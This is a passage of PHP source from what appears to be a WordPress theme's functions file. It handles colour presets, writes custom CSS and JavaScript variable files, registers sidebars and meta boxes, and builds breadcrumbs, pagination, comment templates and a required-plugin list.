						$themevariables['menu_color'] = '#222';
						$themevariables['header_border_color'] = 'rgba(0,0,0,.1);';
						$themevariables['header_sticky_bg'] = 'rgba(255,255,255,.8);';
						break;
					case 4:  
						$themevariables['header_bg'] = '#ffffff';
						$themevariables['header_color'] = '#555555';  
						$themevariables['header_link_color'] = '#555555';  
						$themevariables['topbar_color'] = '#555555';  
						$themevariables['topbar_link_hover_color'] = '#cea679';  
						$themevariables['topbar_link_color'] = '#555555';
						$themevariables['menu_color'] = '#222';
						$themevariables['header_border_color'] = 'rgba(0,0,0,.1);';
						$themevariables['header_sticky_bg'] = 'rgba(255,255,255,.8);';
						break;
					case 5:  
						$themevariables['header_bg'] = 'transparent'; 
						break;
							
				}

				if(function_exists('compileLessFile')){
					compileLessFile('theme.less', 'theme'.$presetopt.'.css', $themevariables);
				}
			}
		}
		
		// Load main theme css style files
		wp_enqueue_style( 'beeta-theme-style', get_template_directory_uri() . '/css/theme'.$presetopt.'.css', array('bootstrap'), '1.0.0' ); 
		wp_enqueue_style( 'beeta-custom', get_template_directory_uri() . '/css/opt_css.css', array('beeta-theme-style'), '1.0.0' );
		
		if(function_exists('WP_Filesystem')){
			if ( ! WP_Filesystem() ) {
				$url = wp_nonce_url();
				request_filesystem_credentials($url, '', true, false, null);
			}
			
			global $wp_filesystem;
			//add custom css, sharing code to header
			if($wp_filesystem->exists(get_template_directory(). '/css/opt_css.css')){
				$customcss = $wp_filesystem->get_contents(get_template_directory(). '/css/opt_css.css');
				
				if(isset($beeta_opt['custom_css']) && $customcss!=$beeta_opt['custom_css']){ //if new update, write file content
					$wp_filesystem->put_contents(
						get_template_directory(). '/css/opt_css.css',
						$beeta_opt['custom_css'],
						FS_CHMOD_FILE // predefined mode settings for WP files
					);
				}
			} else {
				$wp_filesystem->put_contents(
					get_template_directory(). '/css/opt_css.css',
					$beeta_opt['custom_css'],
					FS_CHMOD_FILE // predefined mode settings for WP files
				);
			}
		}
		
		//add javascript variables
		ob_start(); ?> 
		var beeta_brandnumber = <?php if(isset($beeta_opt['brandnumber'])) { echo esc_js($beeta_opt['brandnumber']); } else { echo '6'; } ?>,
			beeta_brandscrollnumber = <?php if(isset($beeta_opt['brandscrollnumber'])) { echo esc_js($beeta_opt['brandscrollnumber']); } else { echo '2';} ?>,
			beeta_brandpause = <?php if(isset($beeta_opt['brandpause'])) { echo esc_js($beeta_opt['brandpause']); } else { echo '3000'; } ?>,
			beeta_brandanimate = <?php if(isset($beeta_opt['brandanimate'])) { echo esc_js($beeta_opt['brandanimate']); } else { echo '700';} ?>;
		var beeta_brandscroll = false;
			<?php if(isset($beeta_opt['brandscroll'])){ ?>
				beeta_brandscroll = <?php echo esc_js($beeta_opt['brandscroll'])==1 ? 'true': 'false'; ?>;
			<?php } ?>
		var beeta_categoriesnumber = <?php if(isset($beeta_opt['categoriesnumber'])) { echo esc_js($beeta_opt['categoriesnumber']); } else { echo '6'; } ?>,
			beeta_categoriesscrollnumber = <?php if(isset($beeta_opt['categoriesscrollnumber'])) { echo esc_js($beeta_opt['categoriesscrollnumber']); } else { echo '2';} ?>,
			beeta_categoriespause = <?php if(isset($beeta_opt['categoriespause'])) { echo esc_js($beeta_opt['categoriespause']); } else { echo '3000'; } ?>,
			beeta_categoriesanimate = <?php if(isset($beeta_opt['categoriesanimate'])) { echo esc_js($beeta_opt['categoriesanimate']); } else { echo '700';} ?>;
		var beeta_categoriesscroll = 'false';
			<?php if(isset($beeta_opt['categoriesscroll'])){ ?>
				beeta_categoriesscroll = <?php echo esc_js($beeta_opt['categoriesscroll'])==1 ? 'true': 'false'; ?>;
			<?php } ?>
		var beeta_blogpause = <?php if(isset($beeta_opt['blogpause'])) { echo esc_js($beeta_opt['blogpause']); } else { echo '3000'; } ?>,
			beeta_bloganimate = <?php if(isset($beeta_opt['bloganimate'])) { echo esc_js($beeta_opt['bloganimate']); } else { echo '700'; } ?>;
		var beeta_blogscroll = false;
			<?php if(isset($beeta_opt['blogscroll'])){ ?>
				beeta_blogscroll = <?php echo esc_js($beeta_opt['blogscroll'])==1 ? 'true': 'false'; ?>;
			<?php } ?>
		var beeta_testipause = <?php if(isset($beeta_opt['testipause'])) { echo esc_js($beeta_opt['testipause']); } else { echo '3000'; } ?>,
			beeta_testianimate = <?php if(isset($beeta_opt['testianimate'])) { echo esc_js($beeta_opt['testianimate']); } else { echo '700'; } ?>;
		var beeta_testiscroll = false;
			<?php if(isset($beeta_opt['testiscroll'])){ ?>
				beeta_testiscroll = <?php echo esc_js($beeta_opt['testiscroll'])==1 ? 'true': 'false'; ?>;
			<?php } ?>
		var beeta_catenumber = <?php if(isset($beeta_opt['catenumber'])) { echo esc_js($beeta_opt['catenumber']); } else { echo '6'; } ?>,
			beeta_catescrollnumber = <?php if(isset($beeta_opt['catescrollnumber'])) { echo esc_js($beeta_opt['catescrollnumber']); } else { echo '2';} ?>,
			beeta_catepause = <?php if(isset($beeta_opt['catepause'])) { echo esc_js($beeta_opt['catepause']); } else { echo '3000'; } ?>,
			beeta_cateanimate = <?php if(isset($beeta_opt['cateanimate'])) { echo esc_js($beeta_opt['cateanimate']); } else { echo '700';} ?>;
		var beeta_catescroll = false;
			<?php if(isset($beeta_opt['catescroll'])){ ?>
				beeta_catescroll = <?php echo esc_js($beeta_opt['catescroll'])==1 ? 'true': 'false'; ?>;
			<?php } ?>
		var beeta_menu_number = <?php if(isset($beeta_opt['categories_menu_items'])) { echo esc_js((int)$beeta_opt['categories_menu_items']+1); } else { echo '9';} ?>;
		var beeta_sticky_header = false;
			<?php if(isset($beeta_opt['sticky_header'])){ ?>
				beeta_sticky_header = <?php echo esc_js($beeta_opt['sticky_header'])==1 ? 'true': 'false'; ?>;
			<?php } ?>

		jQuery(document).ready(function(){
			jQuery("#ws").focus(function(){
				if(jQuery(this).val()=="<?php echo esc_html__( 'Search product...', 'beeta' )?>"){
					jQuery(this).val("");
				}
			});
			jQuery("#ws").focusout(function(){
				if(jQuery(this).val()==""){
					jQuery(this).val("<?php echo esc_html__( 'Search product...', 'beeta' )?>");
				}
			});
			jQuery("#wsearchsubmit").on('click',function(){
				if(jQuery("#ws").val()=="<?php echo esc_html__( 'Search product...', 'beeta' )?>" || jQuery("#ws").val()==""){
					jQuery("#ws").focus();
					return false;
				}
			});
			jQuery("#search_input").focus(function(){
				if(jQuery(this).val()=="<?php echo esc_html__( 'Search...', 'beeta' )?>"){
					jQuery(this).val("");
				}
			});
			jQuery("#search_input").focusout(function(){
				if(jQuery(this).val()==""){
					jQuery(this).val("<?php echo esc_html__( 'Search...', 'beeta' )?>");
				}
			});
			jQuery("#blogsearchsubmit").on('click',function(){
				if(jQuery("#search_input").val()=="<?php echo esc_html__( 'Search...', 'beeta' )?>" || jQuery("#search_input").val()==""){
					jQuery("#search_input").focus();
					return false;
				}
			});
		});
		<?php
		$jsvars = ob_get_contents();
		ob_end_clean();
		
		if(function_exists('WP_Filesystem')){
			if($wp_filesystem->exists(get_template_directory(). '/js/variables.js')){
				$jsvariables = $wp_filesystem->get_contents(get_template_directory(). '/js/variables.js');
				
				if($jsvars!=$jsvariables){ //if new update, write file content
					$wp_filesystem->put_contents(
						get_template_directory(). '/js/variables.js',
						$jsvars,
						FS_CHMOD_FILE // predefined mode settings for WP files
					);
				}
			} else {
				$wp_filesystem->put_contents(
					get_template_directory(). '/js/variables.js',
					$jsvars,
					FS_CHMOD_FILE // predefined mode settings for WP files
				);
			}
		}
		//add css for footer, header templates
		$jscomposer_templates_args = array(
			'orderby'          => 'title',
			'order'            => 'ASC',
			'post_type'        => 'templatera',
			'post_status'      => 'publish',
			'posts_per_page'   => 30,
		);
		$jscomposer_templates = get_posts( $jscomposer_templates_args );

		if(count($jscomposer_templates) > 0) {
			foreach($jscomposer_templates as $jscomposer_template){
				if($jscomposer_template->post_title == $beeta_opt['header_layout'] || $jscomposer_template->post_title == $beeta_opt['footer_layout']){
					$jscomposer_template_css = get_post_meta ( $jscomposer_template->ID, '_wpb_shortcodes_custom_css', false );
					if(isset($jscomposer_template_css[0])) {
						wp_add_inline_style( 'beeta-custom', $jscomposer_template_css[0] );
					} 
				}
			}
		}
		
		//page width
		wp_add_inline_style( 'beeta-custom', '.wrapper.box-layout, .wrapper.box-layout .container, .wrapper.box-layout .row-container {max-width: '.$beeta_opt['box_layout_width'].'px;}' );
	}
	 
	//add sharing code to header
	function beeta_custom_code_header() {
		global $beeta_opt;

		if ( isset($beeta_opt['share_head_code']) && $beeta_opt['share_head_code']!='') {
			echo wp_kses($beeta_opt['share_head_code'], array(
				'script' => array(
					'type' => array(),
					'src' => array(),
					'async' => array()
				),
			));
		}
	}
	/**
	 * Register sidebars.
	 *
	 * Registers our main widget area and the front page widget areas.
	 *
	 * @since Beeta 1.0
	 */
	function beeta_widgets_init() {
		$beeta_opt = get_option( 'beeta_opt' );
		
		register_sidebar( array(
			'name' => esc_html__( 'Blog Sidebar', 'beeta' ),
			'id' => 'sidebar-1',
			'description' => esc_html__( 'Sidebar on blog page', 'beeta' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title"><span>',
			'after_title' => '</span></h3>',
		) );
		
		register_sidebar( array(
			'name' => esc_html__( 'Shop Sidebar', 'beeta' ),
			'id' => 'sidebar-shop',
			'description' => esc_html__( 'Sidebar on shop page (only sidebar shop layout)', 'beeta' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title"><span>',
			'after_title' => '</span></h3>',
		) );

		register_sidebar( array(
			'name' => esc_html__( 'Pages Sidebar', 'beeta' ),
			'id' => 'sidebar-page',
			'description' => esc_html__( 'Sidebar on content pages', 'beeta' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title"><span>',
			'after_title' => '</span></h3>',
		) );
		
		if(isset($beeta_opt['custom-sidebars']) && $beeta_opt['custom-sidebars']!=""){
			foreach($beeta_opt['custom-sidebars'] as $sidebar){
				$sidebar_id = str_replace(' ', '-', strtolower($sidebar));
				
				if($sidebar_id!='') {
					register_sidebar( array(
						'name' => $sidebar,
						'id' => $sidebar_id,
						'description' => $sidebar,
						'before_widget' => '<aside id="%1$s" class="widget %2$s">',
						'after_widget' => '</aside>',
						'before_title' => '<h3 class="widget-title"><span>',
						'after_title' => '</span></h3>',
					) );
				}
			}
		}
	}
	static function beeta_meta_box_callback( $post ) {

		// Add an nonce field so we can check for it later.
		wp_nonce_field( 'beeta_meta_box', 'beeta_meta_box_nonce' );

		/*
		 * Use get_post_meta() to retrieve an existing value
		 * from the database and use the value for the form.
		 */
		$value = get_post_meta( $post->ID, '_beeta_post_intro', true );

		echo '<label for="beeta_post_intro">';
		esc_html_e( 'This content will be used to replace the featured image, use shortcode here', 'beeta' );
		echo '</label><br />';
		wp_editor( $value, 'beeta_post_intro', $settings = array() );
	}
	static function beeta_custom_sidebar_callback( $post ) {
		global $wp_registered_sidebars;

		$beeta_opt = get_option( 'beeta_opt' );

		// Add an nonce field so we can check for it later.
		wp_nonce_field( 'beeta_meta_box', 'beeta_meta_box_nonce' );

		/*
		 * Use get_post_meta() to retrieve an existing value
		 * from the database and use the value for the form.
		 */

		//show sidebar dropdown select
		$csidebar = get_post_meta( $post->ID, '_beeta_custom_sidebar', true );

		echo '<label for="beeta_custom_sidebar">';
		esc_html_e( 'Select a custom sidebar for this post/page', 'beeta' );
		echo '</label><br />';

		echo '<select id="beeta_custom_sidebar" name="beeta_custom_sidebar">';
			echo '<option value="">'.esc_html__('- None -', 'beeta').'</option>';
			foreach($wp_registered_sidebars as $sidebar){
				$sidebar_id = $sidebar['id'];
				if($csidebar == $sidebar_id){
					echo '<option value="'.$sidebar_id.'" selected="selected">'.$sidebar['name'].'</option>';
				} else {
					echo '<option value="'.$sidebar_id.'">'.$sidebar['name'].'</option>';
				}
			}
		echo '</select><br />';

		//show custom sidebar position
		$csidebarpos = get_post_meta( $post->ID, '_beeta_custom_sidebar_pos', true );

		echo '<label for="beeta_custom_sidebar_pos">';
		esc_html_e( 'Sidebar position', 'beeta' );
		echo '</label><br />';

		echo '<select id="beeta_custom_sidebar_pos" name="beeta_custom_sidebar_pos">'; ?>
			<option value="left" <?php if($csidebarpos == 'left') {echo 'selected="selected"';}?>><?php echo esc_html__('Left', 'beeta'); ?></option>
			<option value="right" <?php if($csidebarpos == 'right') {echo 'selected="selected"';}?>><?php echo esc_html__('Right', 'beeta'); ?></option>
		<?php echo '</select>';
	}

	
	function beeta_save_meta_box_data( $post_id ) {

		/*
		 * We need to verify this came from our screen and with proper authorization,
		 * because the save_post action can be triggered at other times.
		 */

		// Check if our nonce is set.
		if ( ! isset( $_POST['beeta_meta_box_nonce'] ) ) {
			return;
		}

		// Verify that the nonce is valid.
		if ( ! wp_verify_nonce( $_POST['beeta_meta_box_nonce'], 'beeta_meta_box' ) ) {
			return;
		}

		// If this is an autosave, our form has not been submitted, so we don't want to do anything.
		if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
			return;
		}

		// Check the user's permissions.
		if ( isset( $_POST['post_type'] ) && 'page' == $_POST['post_type'] ) {

			if ( ! current_user_can( 'edit_page', $post_id ) ) {
				return;
			}

		} else {

			if ( ! current_user_can( 'edit_post', $post_id ) ) {
				return;
			}
		}

		/* OK, it's safe for us to save the data now. */
		
		// Make sure that it is set.
		if ( ! ( isset( $_POST['beeta_post_intro'] ) || isset( $_POST['beeta_custom_sidebar'] ) ) )  {
			return;
		}

		// Sanitize user input.
		$my_data = sanitize_text_field( $_POST['beeta_post_intro'] );
		// Update the meta field in the database.
		update_post_meta( $post_id, '_beeta_post_intro', $my_data );

		// Sanitize user input.
		$my_data = sanitize_text_field( $_POST['beeta_custom_sidebar'] );
		// Update the meta field in the database.
		update_post_meta( $post_id, '_beeta_custom_sidebar', $my_data );

		// Sanitize user input.
		$my_data = sanitize_text_field( $_POST['beeta_custom_sidebar_pos'] );
		// Update the meta field in the database.
		update_post_meta( $post_id, '_beeta_custom_sidebar_pos', $my_data );
		
	}
	//Change comment form
	function beeta_before_comment_fields() {
		echo '<div class="comment-input">';
	}
	function beeta_after_comment_fields() {
		echo '</div>';
	}
	/**
	 * Register postMessage support.
	 *
	 * Add postMessage support for site title and description for the Customizer.
	 *
	 * @since Beeta 1.0
	 *
	 * @param WP_Customize_Manager $wp_customize Customizer object.
	 */
	function beeta_customize_register( $wp_customize ) {
		$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
		$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
		$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
	}
	/**
	 * Enqueue Javascript postMessage handlers for the Customizer.
	 *
	 * Binds JS handlers to make the Customizer preview reload changes asynchronously.
	 *
	 * @since Beeta 1.0
	 */
	function beeta_customize_preview_js() {
		wp_enqueue_script( 'beeta-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130301', true );
	}
	// Remove Redux Ads, Notification
	function beeta_remove_redux_framework_notification() {
		if ( class_exists('ReduxFrameworkPlugin') ) {
			// remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
		}
		if ( class_exists('ReduxFrameworkPlugin') ) {
			remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
		}
	}
	function beeta_admin_style() {
	  wp_enqueue_style('admin-styles', get_template_directory_uri().'/css/admin.css');
	}
	/**
	* Utility methods
	* ---------------
	*/
	
	//Add breadcrumbs
	static function beeta_breadcrumb() {
		global $post;

		$beeta_opt = get_option( 'beeta_opt' );
		
		$brseparator = '<span class="separator">/</span>';
		if (!is_home()) {
			echo '<div class="breadcrumbs">';
			
			echo '<a href="';
			echo esc_url( home_url( '/' ));
			echo '">';
			echo esc_html__('Home', 'beeta');
			echo '</a>'.$brseparator;
			if (is_category() || is_single()) {
				the_category($brseparator);
				if (is_single()) {
					echo ''.$brseparator;
					the_title();
				}
			} elseif (is_page()) {
				if($post->post_parent){
					$anc = get_post_ancestors( $post->ID );
					$title = get_the_title();
					foreach ( $anc as $ancestor ) {
						$output = '<a href="'.get_permalink($ancestor).'" title="'.get_the_title($ancestor).'">'.get_the_title($ancestor).'</a>'.$brseparator;
					}
					echo wp_kses($output, array(
							'a'=>array(
								'href' => array(),
								'title' => array()
							),
							'span'=>array(
								'class'=>array()
							)
						)
					);
					echo '<span title="'.$title.'"> '.$title.'</span>';
				} else {
					echo '<span> '.get_the_title().'</span>';
				}
			}
			elseif (is_tag()) {single_tag_title();}
			elseif (is_day()) {printf( esc_html__( 'Archive for: %s', 'beeta' ), '<span>' . get_the_date() . '</span>' );}
			elseif (is_month()) {printf( esc_html__( 'Archive for: %s', 'beeta' ), '<span>' . get_the_date( _x( 'F Y', 'monthly archives date format', 'beeta' ) ) . '</span>' );}
			elseif (is_year()) {printf( esc_html__( 'Archive for: %s', 'beeta' ), '<span>' . get_the_date( _x( 'Y', 'yearly archives date format', 'beeta' ) ) . '</span>' );}
			elseif (is_author()) {echo "<span>".esc_html__('Archive for','beeta'); echo'</span>';}
			elseif (isset($_GET['paged']) && !empty($_GET['paged'])) {echo "<span>".esc_html__('Blog Archives','beeta'); echo'</span>';}
			elseif (is_search()) {echo "<span>".esc_html__('Search Results','beeta'); echo'</span>';}
			
			echo '</div>';
		} else {
			echo '<div class="breadcrumbs">';
			
			echo '<a href="';
			echo esc_url( home_url( '/' ) );
			echo '">';
			echo esc_html__('Home', 'beeta');
			echo '</a>'.$brseparator;
			
			if(isset($beeta_opt['blog_header_text']) && $beeta_opt['blog_header_text']!=""){
				echo esc_html($beeta_opt['blog_header_text']);
			} else {
				echo esc_html__('Blog', 'beeta');
			}
			
			echo '</div>';
		}
	}
	static function beeta_limitStringByWord ($string, $maxlength, $suffix = '') {

		if(function_exists( 'mb_strlen' )) {
			// use multibyte functions by Iysov
			if(mb_strlen( $string )<=$maxlength) return $string;
			$string = mb_substr( $string, 0, $maxlength );
			$index = mb_strrpos( $string, ' ' );
			if($index === FALSE) {
				return $string;
			} else {
				return mb_substr( $string, 0, $index ).$suffix;
			}
		} else { // original code here
			if(strlen( $string )<=$maxlength) return $string;
			$string = substr( $string, 0, $maxlength );
			$index = strrpos( $string, ' ' );
			if($index === FALSE) {
				return $string;
			} else {
				return substr( $string, 0, $index ).$suffix;
			}
		}
	}
	static function beeta_excerpt_by_id($post, $length = 10, $tags = '<a><em><strong>') {
 
		if(is_int($post)) {
			// get the post object of the passed ID
			$post = get_post($post);
		} elseif(!is_object($post)) {
			return false;
		}
	 
		if(has_excerpt($post->ID)) {
			$the_excerpt = $post->post_excerpt;
			return apply_filters('the_content', $the_excerpt);
		} else {
			$the_excerpt = $post->post_content;
		}
	 
		$the_excerpt = strip_shortcodes(strip_tags($the_excerpt), $tags);
		$the_excerpt = preg_split('/\b/', $the_excerpt, $length * 2+1);
		$excerpt_waste = array_pop($the_excerpt);
		$the_excerpt = implode($the_excerpt);
	 
		return apply_filters('the_content', $the_excerpt);
	}
	/**
	 * Return the Google font stylesheet URL if available.
	 *
	 * The use of Open Sans by default is localized. For languages that use
	 * characters not supported by the font, the font can be disabled.
	 *
	 * @since beeta 1.2
	 *
	 * @return string Font stylesheet or empty string if disabled.
	 */
	function beeta_get_font_url() {
		$fonts_url = '';
		 
		/* Translators: If there are characters in your language that are not
		* supported by Open Sans, translate this to 'off'. Do not translate
		* into your own language.
		*/
		$open_sans = _x( 'on', 'Open Sans font: on or off', 'beeta' );
		 
		if ( 'off' !== $open_sans ) {
			$font_families = array();

			if ( 'off' !== $open_sans ) {
				$font_families[] = 'Libre Franklin:300,400,600,700,800';
			}
			
			$query_args = array(
				'family' => urlencode( implode( '|', $font_families ) ),
				'subset' => urlencode( 'latin,latin-ext' ),
			);
			 
			$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
		}
		 
		return esc_url_raw( $fonts_url );
	}
	/**
	 * Displays navigation to next/previous pages when applicable.
	 *
	 * @since Beeta 1.0
	 */
	static function beeta_content_nav( $html_id ) {
		global $wp_query;

		$html_id = esc_attr( $html_id );

		if ( $wp_query->max_num_pages > 1 ) : ?>
			<nav id="<?php echo esc_attr($html_id); ?>" class="navigation" role="navigation">
				<h3 class="assistive-text"><?php esc_html_e( 'Post navigation', 'beeta' ); ?></h3>
				<div class="nav-previous"><?php next_posts_link( wp_kses(__( '<span class="meta-nav">&larr;</span> Older posts', 'beeta' ),array('span'=>array('class'=>array())) )); ?></div>
				<div class="nav-next"><?php previous_posts_link( wp_kses(__( 'Newer posts <span class="meta-nav">&rarr;</span>', 'beeta' ), array('span'=>array('class'=>array())) )); ?></div>
			</nav>
		<?php endif;
	}
	/* Pagination */
	static function beeta_pagination() {
		global $wp_query;

		$big = 999999999; // need an unlikely integer
		if($wp_query->max_num_pages > 1) {
			echo '<div class="pagination-inner">';
		}
			echo paginate_links( array(
				'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
				'format' => '?paged=%#%',
				'current' => max( 1, get_query_var('paged') ),
				'total' => $wp_query->max_num_pages,
				'prev_text'    => esc_html__('Previous', 'beeta'),
				'next_text'    =>esc_html__('Next', 'beeta'),
			) );
		if($wp_query->max_num_pages > 1) {
			echo '</div>';
		}
	}
	/**
	 * Template for comments and pingbacks.
	 *
	 * To override this walker in a child theme without modifying the comments template
	 * simply create your own beeta_comment(), and that function will be used instead.
	 *
	 * Used as a callback by wp_list_comments() for displaying the comments.
	 *
	 * @since Beeta 1.0
	 */
	static function beeta_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		switch ( $comment->comment_type ) :
			case 'pingback' :
			case 'trackback' :
			// Display trackbacks differently than normal comments.
		?>
		<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
			<p><?php esc_html_e( 'Pingback:', 'beeta' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( esc_html__( '(Edit)', 'beeta' ), '<span class="edit-link">', '</span>' ); ?></p>
		<?php
				break;
			default :
			// Proceed with normal comments.
			global $post;
		?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<article id="comment-<?php comment_ID(); ?>" class="comment">
				<div class="comment-avatar">
					<?php echo get_avatar( $comment, 50 ); ?>
				</div>
				<div class="comment-info">
					<header class="comment-meta comment-author vcard">
						<?php
							
							printf( '<cite><b class="fn">%1$s</b> %2$s</cite>',
								get_comment_author_link(),
								// If current post author is also comment author, make it known visually.
								( $comment->user_id === $post->post_author ) ? '<span>' . esc_html__( 'Post author', 'beeta' ) . '</span>' : ''
							);
							printf( '<time datetime="%1$s">%2$s</time>',
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
								sprintf( esc_html__( '%1$s at %2$s', 'beeta' ), get_comment_date(), get_comment_time() )
							);
						?>
						<div class="reply">
							<?php comment_reply_link( array_merge( $args, array( 'reply_text' => esc_html__( 'Reply', 'beeta' ), 'after' => '', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
						</div><!-- .reply -->
					</header><!-- .comment-meta -->
					<?php if ( '0' == $comment->comment_approved ) : ?>
						<p class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'beeta' ); ?></p>
					<?php endif; ?>

					<section class="comment-content comment">
						<?php comment_text(); ?>
						<?php edit_comment_link( esc_html__( 'Edit', 'beeta' ), '<p class="edit-link">', '</p>' ); ?>
					</section><!-- .comment-content -->
				</div>
			</article><!-- #comment-## -->
		<?php
			break;
		endswitch; // end comment_type check
	}
	/**
	 * Set up post entry meta.
	 *
	 * Prints HTML with meta information for current post: categories, tags, permalink, author, and date.
	 *
	 * Create your own beeta_entry_meta() to override in a child theme.
	 *
	 * @since Beeta 1.0
	 */
	static function beeta_entry_meta() {
		
		// Translators: used between list items, there is a space after the comma.
		$tag_list = get_the_tag_list( '', ', ' );

		$num_comments = (int)get_comments_number();
		$write_comments = '';
		if ( comments_open() ) {
			if ( $num_comments == 0 ) {
				$comments = esc_html__('0 comments', 'beeta');
			} elseif ( $num_comments > 1 ) {
				$comments = $num_comments . esc_html__(' comments', 'beeta');
			} else {
				$comments = esc_html__('1 comment', 'beeta');
			}
			$write_comments = '<a href="' . get_comments_link() .'">'. $comments.'</a>';
		}

		$utility_text = null;
		if ( ( post_password_required() || !comments_open() ) && ($tag_list!=false && isset($tag_list) ) ) {
			$utility_text = esc_html__( 'Tags: %2$s', 'beeta' );
		} elseif($tag_list!=false && isset($tag_list) && $num_comments !=0 ){
			$utility_text = esc_html__( '%1$s / Tags: %2$s', 'beeta' );
		} elseif ( ($num_comments ==0 || !isset($num_comments) ) && $tag_list==true ) {
			$utility_text = esc_html__( 'Tags: %2$s', 'beeta' );
		} else {
			$utility_text = esc_html__( '%1$s', 'beeta' );
		}
		
		printf( $utility_text, $write_comments, $tag_list);
	}
	static function beeta_entry_meta_small() {
		
		// Translators: used between list items, there is a space after the comma.
		$categories_list = get_the_category_list(', ');

		$author = sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( wp_kses(__( 'View all posts by %s', 'beeta' ), array('a'=>array())), get_the_author() ) ),
			get_the_author()
		);
		
		$utility_text = esc_html__( 'Posted by %1$s  %2$s', 'beeta' );

		printf( $utility_text, $author, $categories_list );
		
	}
	static function beeta_entry_comments() {
		
		$date = sprintf( '<time class="entry-date" datetime="%3$s">%4$s</time>',
			esc_url( get_permalink() ),
			esc_attr( get_the_time() ),
			esc_attr( get_the_date( 'c' ) ),
			esc_html( get_the_date() )
		);

		$num_comments = (int)get_comments_number();
		$write_comments = '';
		if ( comments_open() ) {
			if ( $num_comments == 0 ) {
				$comments = wp_kses(__('<span>0</span> comments', 'beeta'), array('span'=>array()));
			} elseif ( $num_comments > 1 ) {
				$comments = '<span>'.$num_comments .'</span>'. esc_html__(' comments', 'beeta');
			} else {
				$comments = wp_kses(__('<span>1</span> comment', 'beeta'), array('span'=>array()));
			}
			$write_comments = '<a href="' . get_comments_link() .'">'. $comments.'</a>';
		}
		
		$utility_text = esc_html__( '%1$s', 'beeta' );
		
		printf( $utility_text, $write_comments );
	}
	/**
	* TGM-Plugin-Activation
	*/
	function beeta_register_required_plugins() {

		$plugins = array(
			array(
				'name'               => esc_html__('Roadthemes Helper', 'beeta'),
				'slug'               => 'roadthemes-helper',
				'source'             => get_template_directory() . '/plugins/roadthemes-helper.zip',
				'required'           => true,
				'version'            => '1.0.0',
				'force_activation'   => false,
				'force_deactivation' => false,
				'external_url'       => '',
			),
			array(
				'name'               => esc_html__('Mega Main Menu', 'beeta'),
				'slug'               => 'mega_main_menu',
				'source'             => get_template_directory() . '/plugins/mega_main_menu.zip',
				'required'           => true,
				'external_url'       => '',
			),
			array(
				'name'               => esc_html__('Revolution Slider', 'beeta'),
				'slug'               => 'revslider',
				'source'             => get_template_directory() . '/plugins/revslider.zip',
				'required'           => true,
				'external_url'       => '',
			),
			array(
				'name'               => 'Import Sample Data',
				'slug'               => 'road-importdata',
				'source'             => get_template_directory() . '/plugins/road-importdata.zip',
				'required'           => true,
				'external_url'       => '',
			),
			array(
				'name'               => esc_html__('Visual Composer', 'beeta'),
				'slug'               => 'js_composer',
				'source'             => get_template_directory() . '/plugins/js_composer.zip',
				'required'           => true,
				'external_url'       => '',
			),
			array(
				'name'               => esc_html__('Templatera', 'beeta'),
				'slug'               => 'templatera',
				'source'             => get_template_directory() . '/plugins/templatera.zip',
				'required'           => true,
				'external_url'       => '',
			),
		 
			 
			// Plugins from the WordPress Plugin Repository.
			array(
				'name'               => esc_html__('Redux Framework', 'beeta'),
				'slug'               => 'redux-framework',
				'required'           => true,
				'force_activation'   => false,
				'force_deactivation' => false,
			),
			array(
				'name'      => esc_html__('Contact Form 7', 'beeta'),
				'slug'      => 'contact-form-7',
				'required'  => true,
			), 
			  
			array(
				'name'      => esc_html__('MailChimp for WordPress', 'beeta'),
				'slug'      => 'mailchimp-for-wp',
				'required'  => true,
			),
			array(
				'name'      => esc_html__('Shortcodes Ultimate', 'beeta'),
				'slug'      => 'shortcodes-ultimate',
				'required'  => true,
			),
			array(
				'name'      => esc_html__('Simple Local Avatars', 'beeta'),
				'slug'      => 'simple-local-avatars',
				'required'  => false,
			),
			array(
				'name'      => esc_html__('Testimonials', 'beeta'),
				'slug'      => 'testimonials-by-woothemes',
				'required'  => true,
			),
			array(
				'name'      => esc_html__('TinyMCE Advanced', 'beeta'),
				'slug'      => 'tinymce-advanced',
				'required'  => false,
			),
			array(
				'name'      => esc_html__('Widget Importer & Exporter', 'beeta'),
				'slug'      => 'widget-importer-exporter',
				'required'  => false,
			),
			array(
				'name'      => esc_html__('WooCommerce', 'beeta'),
				'slug'      => 'woocommerce',
				'required'  => true,
			),
			array(
				'name'      => esc_html__('YITH WooCommerce Compare', 'beeta'),
				'slug'      => 'yith-woocommerce-compare',
				'required'  => false,
			),
			array(
				'name'      => esc_html__('YITH WooCommerce Wishlist', 'beeta'),
				'slug'      => 'yith-woocommerce-wishlist',
				'required'  => false,
			),
			array(
				'name'      => esc_html__('YITH WooCommerce Zoom Magnifier', 'beeta'),
				'slug'      => 'yith-woocommerce-zoom-magnifier',
				'required'  => false,
			),
		);

		/**
		 * Array of configuration settings. Amend each line as needed.
		 * If you want the default strings to be available under your own theme domain,
		 * leave the strings uncommented.
		 * Some of the strings are added into a sprintf, so see the comments at the
		 * end of each line for what each argument will be.
		 */
		$config = array(
